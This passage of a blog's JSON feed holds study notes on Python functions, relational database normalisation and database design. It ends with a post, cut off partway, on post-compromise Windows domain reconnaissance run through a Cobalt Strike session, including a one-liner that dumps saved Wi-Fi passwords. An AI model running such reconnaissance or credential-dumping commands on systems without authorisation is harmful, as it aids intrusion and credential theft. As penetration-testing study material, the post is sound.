data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> 函数名<span class=\"token punctuation\">(</span>形参表<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    函数体与序列</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">[</span>retern 表达式<span class=\"token punctuation\">]</span> <span class=\"token comment\">#可选项</span></pre></td></tr></table></figure><p>函数调用：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>函数名<span class=\"token punctuation\">(</span>形参表<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>注：</p>\n<ol>\n<li><code>函数必须先定义再使用</code></li>\n<li><code>函数名与变量名的命名规则相同</code></li>\n</ol>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131161725327.png\" alt=\"image-20230131161725327\" /></p>\n<h3 id=\"局部变量全局变量\"><a class=\"anchor\" href=\"#局部变量全局变量\">#</a> 局部变量 &amp; 全局变量</h3>\n<h4 id=\"局部变量\"><a class=\"anchor\" href=\"#局部变量\">#</a> 局部变量</h4>\n<ul>\n<li>局部变量是只能在函数或代码块内使用的变量</li>\n<li>函数或代码段一旦结束，局部变量的生命周期也就结束</li>\n<li>局部变量的作用范围只在其被创建的函数内有效</li>\n</ul>\n<h4 id=\"全局变量\"><a class=\"anchor\" href=\"#全局变量\">#</a> 全局变量</h4>\n<ul>\n<li>全局变量是能够被不同的函数、类或文件共享的变量</li>\n<li>在函数之外定义的变量都可以称为全局变量</li>\n<li>全局变量可以被文件内部的任何函数和外部文件访问</li>\n<li>全局变量通常在文件的开始处定义</li>\n</ul>\n<h3 id=\"模块导入方式\"><a class=\"anchor\" href=\"#模块导入方式\">#</a> 模块导入方式</h3>\n<ol>\n<li>import 语句，导入整个模块</li>\n<li>from...import... 语句，导入模块的部分属性</li>\n</ol>\n<h3 id=\"自定义包和模块\"><a class=\"anchor\" href=\"#自定义包和模块\">#</a> 自定义包和模块</h3>\n<p>Python 程序除了可以直接运行，还可以作为模块导入并使用其中的对象，通过__name__属性可以识别程序的使用方式：</p>\n<ul>\n<li>每个 Python 脚本在运行时都有一个__name__属性，如果脚本作为模板被导入，则其__name__属性的值被自动设置为模块名</li>\n<li>如果脚本独立运行，则其__name__属性被制动设置为字符串__main__</li>\n</ul>\n<p>对于大型软件开发，不可能把所有的代码都放到一个文件中，这样会使得代码难以维护和管理，通常使用包来管理。包是 Python 用来组织命名空间和类的重要方法。在包的每个目录中都要包含一个__init__.py 文件，这个文件是一个空文件，用于表示当前文件夹是一个包，设置__all__变量以及执行初始化包所需要的代码</p>\n",
            "tags": [
                "Python",
                "Python"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/01/05/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E7%90%86%E8%AE%BA/",
            "url": "https://blog.xcu.icu/2023/01/05/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E7%90%86%E8%AE%BA/",
            "title": "关系数据库理论",
            "date_published": "2023-01-04T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>以本篇记录学习数据库第六章，关系数据理论章节的内容</p>\n<h2 id=\"问题的提出\"><a class=\"anchor\" href=\"#问题的提出\">#</a> 问题的提出</h2>\n<h3 id=\"关系模式的表示\"><a class=\"anchor\" href=\"#关系模式的表示\">#</a> 关系模式的表示</h3>\n<p>关系模式主要由五部分组成，一个五元组：R (U,D,DOM,F).</p>\n<ol>\n<li>R 是关系名</li>\n<li>U 是一组属性</li>\n<li>D 为属性组中的属性的域</li>\n<li>DOM 为属性到域的映射</li>\n<li>F 为属性组 U 上的一组数据的依赖</li>\n</ol>\n<p>注：</p>\n<ul>\n<li>由于 D，DOM 与模式设计关系不大，因此本章堪为三元组 R&lt;U,F&gt;</li>\n<li>当且仅当 U 上的一个关系 r 满足 F 时，r 称为关系模式 R&lt;U,F&gt; 的一个关系</li>\n<li>作为二维表，关系要符合一个最基本的条件：每个分量必须是不可分开的数据项。满足了这个关系的关系模式就属于 <code>第一范式</code></li>\n</ul>\n<p>数据依赖：</p>\n<p>是一个关系内部属性与属性之间的一种约束条件，是通过属性间的值的相等与否体现出来的数据间的相互关系</p>\n<p>数据依赖的主要类型</p>\n<ul>\n<li>函数依赖（简记 FD）</li>\n<li>多值依赖（简记 MVD）</li>\n</ul>\n<p>函数依赖的缺点</p>\n<ul>\n<li>数据冗余</li>\n<li>更新异常</li>\n<li>插入异常</li>\n<li>删除异常</li>\n</ul>\n<p><code>一个好的模式应该尽量减少或避免以上的缺点</code></p>\n<h2 id=\"规范化\"><a class=\"anchor\" href=\"#规范化\">#</a> 规范化</h2>\n<h3 id=\"函数依赖\"><a class=\"anchor\" href=\"#函数依赖\">#</a> 函数依赖</h3>\n<pre><code>设R(U)是属性集U上的关系模式，X、Y是U的子集。若对于R(U)的任意一个可能的关系r，r中不可能存在两个元组在X上的属性值相等，而在Y上的属性值不等，则称“X函数确定Y”或“Y函数依赖于x”，记作X+Y。\n</code></pre>\n<pre><code>对于X中的全部属性的集合才能退出Y的称为Y的完全函数依赖，对于X中只要取部分就可以唯一确定Y的叫做部分完全依赖\n</code></pre>\n<pre><code>函数依赖具有传递性，如果X，Y是非平凡函数依赖，且Y函数决定于Z，则可称Z对X传递函数依赖\n</code></pre>\n<h3 id=\"码\"><a class=\"anchor\" href=\"#码\">#</a> 码</h3>\n<p><code>码的关系模型中的一个重要概念</code></p>\n<p>定义：</p>\n<ul>\n<li>可以唯一确定一个元组的属性或属性组叫做候选码（该属性是主其他属性的完全依赖）</li>\n<li>与上一个定义相对应的码是超码，该属性组是其他属性的部分完全依赖</li>\n<li>当一个关系模型中有多个候选码的时候选择其中一个作为主码</li>\n</ul>\n<p>主属性与非主属性</p>\n<ul>\n<li>\n<p><code>主属性</code> 是包含再 <code>任何一个候选码</code> 中的属性</p>\n</li>\n<li>\n<p><code>非主属性</code> 不包含在任何码中的属性（除了主属性都属于非主属性）</p>\n</li>\n</ul>\n<p><code>全码</code> 一个表的全部属性是码就叫全码</p>\n<p><code>外码</code> ， 关系模式 R 中属性或属性组 X 并非 R 的码，但 X 是另一个关系模式的码，则称 X 是 R 的外部码 (Foreign key) 也称外码</p>\n<h3 id=\"范式\"><a class=\"anchor\" href=\"#范式\">#</a> 范式</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230105161147908.png\" alt=\"image-20230105161147908\" /></p>\n<p><code>范式是符合某一种级别的关系模式的集合</code> 。关系数据库中的关系必须满足一定的要求，满足不同程度的要求为不同的范式（简单的理解，范式就是一种规则）</p>\n<p>范式的要求由低到高分为第一范式，第二范式，第三范式，BC 范式，第四范式，第五范式（其中 BC 范式是第三范式的一个补充完善，到底 BC 范式要求一般就称该数据库是比较优化的）</p>\n<p><code>规范化是指一个低级的范式的关系模型，通过模式分解变为高级别的范式</code></p>\n<h4 id=\"1nf\"><a class=\"anchor\" href=\"#1nf\">#</a> 1NF</h4>\n<p>每一个属性都是最小单元不可再分的属性</p>\n<h4 id=\"2nf\"><a class=\"anchor\" href=\"#2nf\">#</a> 2NF</h4>\n<p>首先要满足第一范式，并且每一个非主属性都 <code>完全函数依赖于任意一个候选码</code> ，称为第二范式</p>\n<h4 id=\"3nf\"><a class=\"anchor\" href=\"#3nf\">#</a> 3NF</h4>\n<p>首先满足第一和第二范式，若 R 中不存在这样的码 X，属性组 Y 以及非主属性 Z，三者 <code>不存在传递函数依赖</code></p>\n<h4 id=\"bcnf\"><a class=\"anchor\" href=\"#bcnf\">#</a> BCNF</h4>\n<p>对第三范式的一个修改，或是说是一种扩充。</p>\n<p>首先满足第一范式，当 X 函数依赖于 Y 这 X 必定含有码 (每一个决定因素都包含码)</p>\n<p>性质：</p>\n<ul>\n<li>所有的非主属性都完全函数依赖于每个候选码</li>\n<li>所有主属性都完全函数依赖于每一个不包含它的候选码</li>\n<li>没有任何属性完全函数依赖于非码的任意一组属性</li>\n</ul>\n<h4 id=\"多值依赖\"><a class=\"anchor\" href=\"#多值依赖\">#</a> 多值依赖</h4>\n<p>与函数依赖相对应，一个属性无法唯一确定另一个属性</p>\n<p>这样的缺点：</p>\n<ul>\n<li>数据的冗余度大</li>\n<li>增加操作复杂度</li>\n<li>删除操作复杂</li>\n<li>修改操作复杂</li>\n</ul>\n<p>设 R (U) 是属性 U 上的一个关系模式，X，Y，Z 是 U 的子集，并且 Z=U-X-Y。关系模式 R (U) 中多值依赖 X-&gt;-&gt;Y 成立，当且仅当 R (U) 的任一关系 r，给定的一对 (x,z) 值，有一组 Y 的值，这组值仅仅决定于 x 值而与 z 无关。</p>\n<p>X-&gt;-&gt;Y, 而 Z 为空，这称为平凡的多值依赖否则为非平凡</p>\n<h4 id=\"4nf\"><a class=\"anchor\" href=\"#4nf\">#</a> 4NF</h4>\n<p>属于第一范式，对于 R 的每个非平凡多值依赖 X-&gt;-&gt;Y (Y 不包含于 X)，X 都含有码，则称为 4NF</p>\n<h2 id=\"模式的分解\"><a class=\"anchor\" href=\"#模式的分解\">#</a> 模式的分解</h2>\n<p>无损连接性，保持函数依赖</p>\n",
            "tags": [
                "数据库",
                "数据库"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/01/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/",
            "url": "https://blog.xcu.icu/2023/01/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/",
            "title": "数据库设计",
            "date_published": "2023-01-04T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>本篇以记录数据库第七章的学习记录，本章的重点应该再概念结构设计和逻辑结构设计中。</p>\n<h2 id=\"数据库设计概述\"><a class=\"anchor\" href=\"#数据库设计概述\">#</a> 数据库设计概述</h2>\n<p>数据库设计是指对于一个给定的应用环境，设计优化的 <code>数据库逻辑模式和物理结构</code> ，并据此建立数据库及其应用系统，使之能够有效的存储和管理数据，满足各种用户的应用需求，包括信息管理要求和数据操作要求</p>\n<p>数据库设计的目的是为用户和各种应用系统提供一个信息基础设施和高效率的运行环境</p>\n<h3 id=\"数据库设计的特点\"><a class=\"anchor\" href=\"#数据库设计的特点\">#</a> 数据库设计的特点</h3>\n<p>数据库设计的一个主要特点 ----- <code>三分技术，七分管理，十二分基础数据</code></p>\n<p>管理</p>\n<ul>\n<li>数据库建设项目管理</li>\n<li>企业的业务管理</li>\n</ul>\n<p>基础数据</p>\n<ul>\n<li>收集</li>\n<li>更新新的数据</li>\n</ul>\n<p>第二个特点 ----- <code>结构（数据）设计和行为（处理）设计相结合</code></p>\n<h3 id=\"数据库设计的方法\"><a class=\"anchor\" href=\"#数据库设计的方法\">#</a> 数据库设计的方法</h3>\n<p>手工与经验相结合方法</p>\n<ul>\n<li>设计质量与设计人员的经验和水平有直接关系</li>\n<li>数据库运行一段时间后常常不同程度地发现各种问题提高的维护代价</li>\n</ul>\n<p>规范设计法</p>\n<ul>\n<li>基本思想：过程迭代和逐步求精</li>\n<li>新奥尔良方法\n<ul>\n<li>将数据库设计分为若干阶段和步骤</li>\n</ul>\n</li>\n<li>基于 E-R 模型的数据库设计方法\n<ul>\n<li>概念设计阶段广泛采用</li>\n</ul>\n</li>\n<li>3NF 的设计方法\n<ul>\n<li>逻辑阶段可采用的有效方法</li>\n</ul>\n</li>\n<li>ODL 方法\n<ul>\n<li>面向对象的设计方法</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"数据库设计的基本步骤\"><a class=\"anchor\" href=\"#数据库设计的基本步骤\">#</a> 数据库设计的基本步骤</h3>\n<p>主要分为六个阶段</p>\n<ol>\n<li>需求分析\n<ul>\n<li>需求收集和分析</li>\n</ul>\n</li>\n<li>概念结构设计\n<ul>\n<li>设计 E-R 模型</li>\n</ul>\n</li>\n<li>逻辑结构设计\n<ul>\n<li>设计逻辑结构数据模型优化</li>\n</ul>\n</li>\n<li>物理结构设计\n<ul>\n<li>设计物理结构评价设计，性能预测</li>\n</ul>\n</li>\n<li>数据库实施\n<ul>\n<li>物理实现尝试运行</li>\n</ul>\n</li>\n<li>数据库运行和维护\n<ul>\n<li>使用、维护数据库</li>\n</ul>\n</li>\n</ol>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230105170541371.png\" alt=\"image-20230105170541371\" /></p>\n<h3 id=\"数据库设计过程中的各级模式\"><a class=\"anchor\" href=\"#数据库设计过程中的各级模式\">#</a> 数据库设计过程中的各级模式</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230105171313745.png\" alt=\"image-20230105171313745\" /></p>\n<h2 id=\"需求分析\"><a class=\"anchor\" href=\"#需求分析\">#</a> 需求分析</h2>\n<h3 id=\"需求分析的任务\"><a class=\"anchor\" href=\"#需求分析的任务\">#</a> 需求分析的任务</h3>\n<ul>\n<li>详细调查现实世界要处理的对象 (组织、部门企等）</li>\n<li>充分了解原系统 (手工系统或计算机系统）</li>\n<li>明确用户的各种需求</li>\n<li>确定新系统的功能</li>\n<li>充分考虑今后可能的扩充和改变</li>\n</ul>\n<h3 id=\"需求分析的重点\"><a class=\"anchor\" href=\"#需求分析的重点\">#</a> 需求分析的重点</h3>\n<ul>\n<li>调查的重点是 “数据” 和 “处理”，获得用户对数据库要求\n<ul>\n<li>信息要求</li>\n<li>处理要求</li>\n<li>安全性与完整性要求</li>\n</ul>\n</li>\n<li>确定用户最终需求\n<ul>\n<li>用户缺少计算机知识</li>\n<li>设计人员缺少用户的专业知识</li>\n</ul>\n</li>\n<li>解决办法\n<ul>\n<li>设计人员必须不断深入地与用户进行交流</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"需求分析的方法\"><a class=\"anchor\" href=\"#需求分析的方法\">#</a> 需求分析的方法</h3>\n<ul>\n<li>调查了解清楚用户的实际需求并进行初步分析\n<ol>\n<li>调查组织机构情况</li>\n<li><code>调查各部门的业务活动情况</code></li>\n<li><code>协助用户明确对新系统的要求</code></li>\n<li>确定新系统的边界</li>\n</ol>\n</li>\n<li>与用户达成共识</li>\n<li>进一步分析与表达这些需求</li>\n</ul>\n<p>常用方法</p>\n<ul>\n<li>跟班作业（耗时但是有效）</li>\n<li>开调查会（常用）</li>\n<li>问卷调查（简单有效）</li>\n</ul>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230105172604633.png\" alt=\"image-20230105172604633\" /></p>\n<h3 id=\"数据字典\"><a class=\"anchor\" href=\"#数据字典\">#</a> 数据字典</h3>\n<p>用途： <code>是系统中各类数据描述的集合，进行详细的数据收集和数据分析所获得的主要结果</code></p>\n<p>字典的内容</p>\n<ul>\n<li>数据项\n<ul>\n<li>不可再分的数据单位</li>\n</ul>\n</li>\n<li>数据结构\n<ul>\n<li>反应了数据之间的组合关系</li>\n</ul>\n</li>\n<li>数据流\n<ul>\n<li>数据结构再系统内传输的路径</li>\n</ul>\n</li>\n<li>数据存储\n<ul>\n<li>数据结构停留和保存的地方，也是数据流的来源和去向之一</li>\n</ul>\n</li>\n<li>处理过程\n<ul>\n<li>描述处理过程的说明性信息</li>\n</ul>\n</li>\n</ul>\n<p><code>数据字典是关于数据库中数据的描述，是元数据，而不是数据本身</code></p>\n<h2 id=\"概念结构设计\"><a class=\"anchor\" href=\"#概念结构设计\">#</a> 概念结构设计</h2>\n<h3 id=\"概念模型\"><a class=\"anchor\" href=\"#概念模型\">#</a> 概念模型</h3>\n<p>概念模型的主要特点是：</p>\n<ul>\n<li>能真实，充分的反映现实世界</li>\n<li>易于理解</li>\n<li>易于更改</li>\n<li>易于向关系网状，层次等数据类型的转换</li>\n</ul>\n<p>属性和实体的划分准则</p>\n<ul>\n<li>属性是不能再具有需要描述的性质</li>\n<li>属性不能与其他实体具有联系</li>\n</ul>\n<h2 id=\"逻辑结构设计\"><a class=\"anchor\" href=\"#逻辑结构设计\">#</a> 逻辑结构设计</h2>\n<p>把上一个阶段设计好的 E-R 模型转换成选用 DBMS 产品支持的数据模型相符合的逻辑结构</p>\n<h3 id=\"e-r图向关系模型的转换\"><a class=\"anchor\" href=\"#e-r图向关系模型的转换\">#</a> E-R 图向关系模型的转换</h3>\n<ul>\n<li>E-R 图向关系模型的转换要解决的问题\n<ul>\n<li>如何将实体型和实体间的联系转换为关系模式</li>\n<li>如何确定这些关系模式的属性和码</li>\n</ul>\n</li>\n<li>转换内容\n<ul>\n<li>将 E-R 图转换为关系模型：将实体、实体的属性和实体之间的联系转换为关系模式</li>\n</ul>\n</li>\n<li>转换原则\n<ul>\n<li><code>一个实体型转换为一个关系模型</code></li>\n<li><code>联系分为多种情况进行转换</code>\n<ol>\n<li>一个 1:1 联系可以转换为一个独立的关系模式，也可以与任意一端对应的关系模式合并。</li>\n<li>一个 l:n 联系可以转换为一个独立的关系模式，也可以与 n 端对应的关系模式合并。</li>\n<li>一个 m:n 联系转换为一个关系模式，</li>\n<li>三个或三个以上实体间的一个多元联系可以转换为一个关系模式。</li>\n<li>具有相同码的关系模式可合并。</li>\n</ol>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"数据模型的优化\"><a class=\"anchor\" href=\"#数据模型的优化\">#</a> 数据模型的优化</h3>\n<p>得到初步数据模型后，还应该适当地修改、调整数据模型的结构，以进一步提高数据库应用系统的性能，这就是数据模型的优化</p>\n<p>关系数据模型的优化通常以规范化理论为指导</p>\n<ol>\n<li>确定数据依赖</li>\n<li>极小化处理</li>\n<li>确定所属范式</li>\n</ol>\n<p>通过分解</p>\n<ul>\n<li>\n<p>水平分解</p>\n<p>把基本关系的元组分为若干子集合，定义每个子集合为一个子关系，以提高系统利用率</p>\n</li>\n<li>\n<p>垂直分解</p>\n<p>把关系模式 R 的属性分解为若干子集合，形成若干子关系模式</p>\n</li>\n</ul>\n<h3 id=\"设计用户子模式\"><a class=\"anchor\" href=\"#设计用户子模式\">#</a> 设计用户子模式</h3>\n<p>注重的问题</p>\n<ol>\n<li>使更符合用户的别名</li>\n<li>针对不同级别的用户定义不同的 View ，以满足系统对安全性的要求。</li>\n<li>简化用户对系统的使用</li>\n</ol>\n<h2 id=\"数据库的物理设计\"><a class=\"anchor\" href=\"#数据库的物理设计\">#</a> 数据库的物理设计</h2>\n<p>数据库在物理设备上的 <code>存储结构与存取方法</code> 称为数据库的物理结构，它依赖于选定的数据库管理系统为一个给定的逻辑数据模型选取一个最适合应用环境的物理结构的过程，就是数据库的物理设计</p>\n<h3 id=\"物理数据库设计的内容和方法\"><a class=\"anchor\" href=\"#物理数据库设计的内容和方法\">#</a> 物理数据库设计的内容和方法</h3>\n<p>设计物理数据库结构的准备工作</p>\n<ul>\n<li>对要运行的事务进行详细分析，获得选择物理数据库设计所需参数</li>\n<li>充分了解所用 RDBMS 的内部特征，特别是系统提供的存取方法和存储结构</li>\n</ul>\n<p>选择物理数据库设计所需参数</p>\n<ul>\n<li>数据库询事务\n<ol>\n<li>查询的关系</li>\n<li>查条件所涉及的属性</li>\n<li>连接条件所涉及的属性</li>\n<li>查询的投影属性</li>\n</ol>\n</li>\n<li>数据更新事务\n<ol>\n<li>被更新的关系</li>\n<li>每个关系上的更新操作条所及的属性</li>\n<li>修改操作要改变的属性值</li>\n</ol>\n</li>\n<li>每个事务在各关系上运行的频率和性能要求</li>\n</ul>\n<p>物理设计的内容</p>\n<ul>\n<li>为关系模式选择 <code>存取方法</code></li>\n<li>设计关系，索引等数据库文件的物理存储结构</li>\n</ul>\n<h3 id=\"关系数据库存取方法选择\"><a class=\"anchor\" href=\"#关系数据库存取方法选择\">#</a> 关系数据库存取方法选择</h3>\n<p>数据库系统是多用户共享的系统，对同一个关系要建立 <code>多条存取路径</code> 才能满足多用户的多种应用要求<br />\n物理设计的任务之一就是要确定选择哪些存取方法，即 <code>建立哪些存取路径</code></p>\n<h3 id=\"确定数据库的存储结构\"><a class=\"anchor\" href=\"#确定数据库的存储结构\">#</a> 确定数据库的存储结构</h3>\n<ol>\n<li>确定数据的存放位置和存储结构\n<ul>\n<li>因素\n<ul>\n<li>存取时间</li>\n<li>存取空间利用率</li>\n<li>维护代价</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>确定系统配置\n<ul>\n<li>原则\n<ul>\n<li>易变部分与稳定部分分开存放</li>\n<li>存取频率较高部分与存取频率较低部分，分开存放</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"数据库实施和维护\"><a class=\"anchor\" href=\"#数据库实施和维护\">#</a> 数据库实施和维护</h2>\n<h3 id=\"数据载入和应用程序的调试\"><a class=\"anchor\" href=\"#数据载入和应用程序的调试\">#</a> 数据载入和应用程序的调试</h3>\n<ul>\n<li>数据的载入\n<ul>\n<li>组织数据入库是数据库实施阶段最主要的工作</li>\n<li>载入方法有人工和计算机辅助两种</li>\n</ul>\n</li>\n<li>应用程序的编码和调试\n<ul>\n<li>数据库应用程序的设计应该与数据设计并行进行</li>\n<li>在组织数据入库的同时还要调试应用程序</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"数据库的试运行\"><a class=\"anchor\" href=\"#数据库的试运行\">#</a> 数据库的试运行</h3>\n<p>在原有系统的数据有一小部分已输入数据库后，就可以开始对数据库系统进行联合调试，称为数据库的试运行</p>\n<ol>\n<li>功能测试\n<ul>\n<li>实际运行数据库应用程序，执行对数据库的各种操作，测试应用程序的功能是否满足设计要求</li>\n<li>如果不满足，对应用程序部分则要修改、调整，直到达到计要求</li>\n</ul>\n</li>\n<li>性能测试\n<ul>\n<li>测量系统的性能指标，分析是否达到设计目标</li>\n<li>如果测试的结果与设计目标不符，则要返回物理设计阶段，重新调整物理结构，修改系统参数，某些情况下甚至要返回逻辑设计阶段，修改逻辑结构</li>\n</ul>\n</li>\n<li>数据库的转储和恢复\n<ul>\n<li>在数据库试运行阶段，系统还不稳定，硬、软故障随时都可能发生</li>\n<li>系统的操作人员对新系统还不熟悉，误操作也不可避免</li>\n<li>因此必须做好数据库的转储和恢复工作，尽量减少对数据库的破坏。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"数据库的运行和维护\"><a class=\"anchor\" href=\"#数据库的运行和维护\">#</a> 数据库的运行和维护</h3>\n<ol>\n<li>数据库试运行合格后，数据库即可投入正式运行。</li>\n<li>数据库投入运行标志着开发任务的基本完成和维护工作的开始</li>\n<li>对数据库设计进行评价、调整、修改等维护工作是个长期的任务，也是设计工作的继续和提高</li>\n</ol>\n",
            "tags": [
                "数据库",
                "数据库"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/12/23/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "url": "https://blog.xcu.icu/2022/12/23/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "title": "内网信息收集",
            "date_published": "2022-12-22T16:00:00.000Z",
            "content_html": "<h3 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h3>\n<p>本篇对内网信息收集做一个补充，这里的命令是运行在 cs 上线的前提下，在命令前要加上 shell</p>\n<h3 id=\"控制机信息收集\"><a class=\"anchor\" href=\"#控制机信息收集\">#</a> 控制机信息收集</h3>\n<h4 id=\"网段\"><a class=\"anchor\" href=\"#网段\">#</a> 网段</h4>\n<p>这个很简单，使用 ipconfig 就可以知道 ip 也就可以知道网段，通过网段可以去扫描其他存活主机</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223194008596.png\" alt=\"image-20221223194008596\" /></p>\n<h4 id=\"进程信息\"><a class=\"anchor\" href=\"#进程信息\">#</a> 进程信息</h4>\n<pre><code>tasklist\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223194159288.png\" alt=\"image-20221223194159288\" /></p>\n<h4 id=\"开机自启\"><a class=\"anchor\" href=\"#开机自启\">#</a> 开机自启</h4>\n<pre><code>wmic startup get command,caption\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223194454199.png\" alt=\"image-20221223194454199\" /></p>\n<p>开机自启如果它后面没有引号可以利用它来提权，提到高权限就会很危险，这里仅做信息收集不在展开</p>\n<h4 id=\"开机时间\"><a class=\"anchor\" href=\"#开机时间\">#</a> 开机时间</h4>\n<pre><code>net statistics workstation\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223194903747.png\" alt=\"image-20221223194903747\" /></p>\n<h4 id=\"查看本地用户\"><a class=\"anchor\" href=\"#查看本地用户\">#</a> 查看本地用户</h4>\n<pre><code>net user\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223195008118.png\" alt=\"image-20221223195008118\" /></p>\n<h4 id=\"会话连接情况\"><a class=\"anchor\" href=\"#会话连接情况\">#</a> 会话连接情况</h4>\n<pre><code>netstat -ano\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223195227859.png\" alt=\"image-20221223195227859\" /></p>\n<h4 id=\"查看补丁信息\"><a class=\"anchor\" href=\"#查看补丁信息\">#</a> 查看补丁信息</h4>\n<pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn\n</code></pre>\n<p>通过这个可以判断一些漏洞有没有被修补</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223195521086.png\" alt=\"image-20221223195521086\" /></p>\n<h4 id=\"查看默认共享\"><a class=\"anchor\" href=\"#查看默认共享\">#</a> 查看默认共享</h4>\n<pre><code>net share\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223195825193.png\" alt=\"image-20221223195825193\" /></p>\n<p>共享是有很多漏洞点控制的</p>\n<h4 id=\"路由信息\"><a class=\"anchor\" href=\"#路由信息\">#</a> 路由信息</h4>\n<pre><code>route print\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223200054631.png\" alt=\"image-20221223200054631\" /></p>\n<h4 id=\"防火墙信息\"><a class=\"anchor\" href=\"#防火墙信息\">#</a> 防火墙信息</h4>\n<pre><code>net firewall show config\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223200348100.png\" alt=\"image-20221223200348100\" /></p>\n<h4 id=\"wifi连接记录\"><a class=\"anchor\" href=\"#wifi连接记录\">#</a> wifi 连接记录</h4>\n<pre><code>for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear\n</code></pre>\n<p>这里因为我搭建的域内服务器没有信息这里放的是我本地的截图</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223200840295.png\" alt=\"image-20221223200840295\" /></p>\n<h4 id=\"arp信息\"><a class=\"anchor\" href=\"#arp信息\">#</a> ARP 信息</h4>\n<p>看还有哪些网段</p>\n<pre><code>arp -a\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223201027450.png\" alt=\"image-20221223201027450\" /></p>\n<h4 id=\"查看最近打开的文档\"><a class=\"anchor\" href=\"#查看最近打开的文档\">#</a> 查看最近打开的文档</h4>\n<pre><code>dir %APPDATA%\\Microsoft\\Windows\\Recent\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223201310126.png\" alt=\"image-20221223201310126\" /></p>\n<h4 id=\"查看本地用户组\"><a class=\"anchor\" href=\"#查看本地用户组\">#</a> 查看本地用户组</h4>\n<pre><code>net localgroup\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223201733749.png\" alt=\"image-20221223201733749\" /></p>\n<h4 id=\"查看组中成员\"><a class=\"anchor\" href=\"#查看组中成员\">#</a> 查看组中成员</h4>\n<pre><code>net localgroup administrators\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223201901678.png\" alt=\"image-20221223201901678\" /></p>\n<p>当电脑加入一个域后，在本地管理员组中有两个默认的管理员，一个是 administrator，一个是域里面的 domain adminis 组。</p>\n<h3 id=\"域内信息收集\"><a class=\"anchor\" href=\"#域内信息收集\">#</a> 域内信息收集</h3>\n<h4 id=\"判断是否存在域\"><a class=\"anchor\" href=\"#判断是否存在域\">#</a> 判断是否存在域</h4>\n<pre><code>ipconfig /all\nsysteminfo\n</code></pre>\n<p>二者都可，前者目光聚焦于 DNS，后者信息很明显</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223203436386.png\" alt=\"image-20221223203436386\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223203404441.png\" alt=\"image-20221223203404441\" /></p>\n<h4 id=\"查看域内上的组\"><a class=\"anchor\" href=\"#查看域内上的组\">#</a> 查看域内上的组</h4>\n<pre><code>net group /domain\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223203948352.png\" alt=\"image-20221223203948352\" /></p>\n<h4 id=\"查看组上的详细成员\"><a class=\"anchor\" 